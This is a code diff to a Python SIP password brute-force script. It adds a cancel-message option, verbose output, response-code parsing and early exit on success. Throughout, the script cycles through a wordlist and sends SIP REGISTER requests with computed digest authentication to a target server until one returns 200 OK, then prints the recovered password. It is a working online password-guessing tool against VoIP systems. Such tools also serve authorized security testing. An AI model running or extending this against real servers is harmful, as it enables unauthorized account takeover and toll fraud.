@@ -56,6 +56,14 @@ parser.add_argument(
 )
 
 parser.add_argument(
+    '--file3',
+    dest="FILE3",
+    type=str,
+    default="cancel.txt",
+    help="The cancel message. Default is \"cancel.txt\""
+)
+
+parser.add_argument(
     '--wordlist',
     dest="WORDLIST",
     type=str,
@@ -87,6 +95,13 @@ parser.add_argument(
     help="The username for password brute force"
 )
 
+parser.add_argument(
+    '-v',
+    action='store_true',
+    help="Verbose mode"
+)
+
+
 args = parser.parse_args()
 
 
@@ -114,6 +129,18 @@ def get_register_auth():
         sys.exit(1)
 
 
+def get_cancel():
+
+    f=open(args.FILE3, "r", newline="")
+    if f.mode == "r":
+        payload = f.read()
+
+        return(payload)
+
+    else:
+        sys.exit(1)
+
+
 def replace_payload(payload):
     
     payload = payload.replace("DOMAIN", args.DOMAIN)
@@ -128,12 +155,22 @@ def replace_payload(payload):
     return(payload) 
 
 
+def create_cancel(callid, branch):
+
+    cancel = get_cancel()
+    cancel = replace_payload(cancel)
+    cancel = cancel.replace("CALLID", callid)
+    cancel = cancel.replace("BRANCH", branch)
+
+    return(cancel)
+
+
 def calc_auth(response, password, callid, branch):
 
-    nonce = re.search(b'nonce="(.+?)",', response).group(1)
+    nonce = re.search(b'nonce="(.+?)"', response).group(1)
     nonce = nonce.decode("utf-8")
 
-    realm = re.search(b'realm="(.+?)",', response).group(1)
+    realm = re.search(b'realm="(.+?)"', response).group(1)
     realm = realm.decode("utf-8")
     
     uri = ("sip:" + str(realm))
@@ -154,10 +191,29 @@ def calc_auth(response, password, callid, branch):
     return(register_auth)
 
 
-def main():
+def get_results(response):
 
-    req = get_register()
-    req = replace_payload(req)
+    if bytes('401 Unauthorized', 'utf-8') in response:
+        return("401")
+
+    elif bytes('407 Proxy Authentication Required', 'utf-8') in response:
+        return("407")
+
+    elif bytes('100 Trying', 'utf-8') in response:
+        return("100")
+
+    elif bytes('200 OK', 'utf-8') in response:
+        return("200")
+
+    elif bytes('403 Forbidden', 'utf-8') in response:
+        return("403")
+
+    else:
+        print("\033[1;34m[*]\033[0m Unexpected response")
+        sys.exit(0)
+
+
+def main():
 
     lines = [line.rstrip('\n') for line in open(args.WORDLIST)]
 
@@ -167,10 +223,12 @@ def main():
         try:
             output=int(round((int(i)/int(len(lines)))*int(100)))
             print("\033[1;34m[*]\033[0m Progress: " + str(output) + "%", end="\r")
-
+            
             callid = ( ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(32)))
             branch = ( ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(10)))
 
+            req = get_register()
+            req = replace_payload(req)
             req = req.replace("CALLID", callid)
             req = req.replace("BRANCH", branch)
 
@@ -185,36 +243,36 @@ def main():
                 sock.connect((args.DST, args.DPORT))
                 sock.send(req.encode())
                 response = sock.recv(1024)
+                
+                result = get_results(response)
 
-                if bytes('100 Trying', 'utf-8') in response:
-                   response = sock.recv(1024)
+                if result == "100": 
+                    response = sock.recv(1024)   
+                    result = get_results(response)
 
-                if bytes('401 Unauthorized', 'utf-8') in response:
-                    print("\033[1;34m[*]\033[0m Nonce recived\r\n")
+                if result == "401" or result == "407":
+                    if args.v:
+                        print("\033[1;34m[*]\033[0m Nonce recived")
                     auth = calc_auth(response, lines[i], callid, branch)
                     sock.send(auth.encode())
                     response = sock.recv(1024)
-                    if bytes('200 OK', 'utf-8') in response: 
-                        print("\033[1;32m[+]\033[0m Registred! Password is: " + lines[i] + "\r\n")
-
-                elif bytes('407 Proxy Authentication Required', 'utf-8') in response: 
-                    print("\033[1;34m[+]\033[0m Nonce recived\r\n")
-                    auth = calc_auth(response, lines[i], callid, branch)
-                    sock.send(auth.encode())
-                    response = sock.recv(1024)
-                    if bytes('200 OK', 'utf-8') in response: 
-                        print("\033[1;32m[+]\033[0m Registred! Password is: " + lines[i] + "\r\n")
-
-                elif bytes('200 OK', 'utf-8') in response: 
-                    print("\033[1;32m[+]\033[0m Registred! Password is: " + lines[i] + "\r\n")
-
-
-
-                sock.close()
-                i += 1
+                    result = get_results(response)
+                    if result == "200": 
+                        print("\033[1;32m[+]\033[0m Registred! Password is: " + lines[i])
+                        sock.close()
+                        sys.exit(0)
+                    else:
+                        sock.close()
+                        i += 1
+                
+                else:
+                    sock.close()
 
             except (KeyboardInterrupt):
                 print("\033[1;34m[*]\033[0m User interruption. Exiting ...")
+                sys.exit(0)
+            
+            except SystemExit:
                 sys.exit(0)
             
             except:
